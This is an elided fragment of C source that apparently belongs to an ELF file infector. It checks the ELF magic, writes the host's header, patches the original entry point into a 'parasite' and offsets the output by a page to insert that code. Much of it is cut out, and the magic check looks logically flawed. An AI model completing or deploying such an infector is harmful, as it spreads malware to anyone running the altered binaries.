...
int main(int argc, char **argv)
{
    ...
    if (e_hdr->e_ident[0] != 0x7f && strcmp((const char*)(&e_hdr->e_ident[1]), "ELF"))
    {
...
void mirror_binary_with_parasite(unsigned int psize, unsigned char *mem, char *parasite)
{
    ...
    if ((c = write(ofd, mem, ehdr_size)) != (unsigned int)ehdr_size)
    {
    ...
    *(unsigned int *)&parasite[return_entry_start] = entry_point;
    ...
    if ((c = lseek(ofd, ehdr_size + PAGE_SIZE, SEEK_SET)) != (unsigned int)(ehdr_size + PAGE_SIZE))
    {
